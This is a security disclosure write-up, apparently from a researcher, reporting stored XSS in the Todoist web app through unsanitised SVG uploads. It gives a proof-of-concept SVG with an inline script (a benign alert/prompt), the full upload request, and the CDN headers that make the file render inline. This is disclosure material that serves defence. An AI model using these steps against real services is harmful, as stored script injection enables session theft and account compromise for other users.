Todoist App - version 8896— Stored XSS via SVG Upload

**Class:** Stored XSS (unsafe SVG rendering)

**Where:** POST /api/v1/uploads 

**Where:** POST /app/task

**Tested:** 2025-09 (webapp ~8895–8896)

Summary
```
Uploaded SVG files are returned with Content-Type: image/svg+xml and inline disposition from a signed CloudFront URL. No sanitization or CSP sandbox is applied, so embedded JavaScript executes when a user opens the attachment from a Todoist task/comment.
```
⸻

PoC (poc.svg)

```
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    alert(prompt("sender_sefa_basnak"));
  ]]></script>
  <rect width="10" height="10" fill="red"/>
</svg>
```
This produces a malicious inline <script> node in the SVG that executes

⸻

1) Upload malicious SVG
```
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    alert(prompt("sender_sefa_basnak"));
  ]]></script>
  <rect width="10" height="10" fill="red"/>
</svg>
```


<img width="1676" height="1117" alt="poc-upload" src="https://github.com/user-attachments/assets/6aaab758-6ee5-4d08-9636-044cc58d3e01" />

Request (snippet)
```
POST /api/v1/uploads HTTP/2
Host: app.todoist.com
Authorization: Bearer <REDACTED>
Content-Type: multipart/form-data; boundary=...

------WebKitFormBoundaryk3GBgFxgqQBDb1iT
Content-Disposition: form-data; name="file_name"

poc.svg
------WebKitFormBoundaryk3GBgFxgqQBDb1iT
Content-Disposition: form-data; name="file_size"

179
------WebKitFormBoundaryk3GBgFxgqQBDb1iT
Content-Disposition: form-data; name="file_type"

image/svg+xml
------WebKitFormBoundaryk3GBgFxgqQBDb1iT
Content-Disposition: form-data; name="project_id"

6cxW6pGcpF7xGvFJ
------WebKitFormBoundaryk3GBgFxgqQBDb1iT
Content-Disposition: form-data; name="file"; filename="poc.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    alert(prompt("sender_sefa_basnak"));
  ]]></script>
  <rect width="10" height="10" fill="red"/>
</svg>


------WebKitFormBoundaryk3GBgFxgqQBDb1iT--
```
UI evidence (upload)

<img width="1013" height="1022" alt="poc-upload2" src="https://github.com/user-attachments/assets/d8403c7f-b0d1-4f26-a053-508b5ebf3074" />


⸻

2) Obtain the signed CDN URL

API response (truncated)
```
{
  "file_url": "https://files.todoist.com/.../by/<uid>/as/file.svg",
  "file_type": "image/svg+xml",
  "upload_state": "completed"
}
```
Following redirects yields a signed CloudFront URL that returns:
```
HTTP/2 200
content-type: image/svg+xml
content-disposition: inline; filename*=UTF-8''poc.svg
```
UI evidence (URL/signed link)


⸻

3) Open the signed URL → JS executes

Opening the signed URL in a browser executes the embedded JavaScript (prompt/alert visible).

Execution evidence

Sample signed URL (redacted)
```https://d1ysz50cxb9zwl.cloudfront.net/.../file.svg?Expires=...&Signature=...&Key-Pair-Id=...```
<img width="1013" height="1022" alt="poc-success" src="https://github.com/user-attachments/assets/e6c3b849-e140-4b90-a746-2d857f687fee" />

⸻

```Discovered by Sefa Basnak```
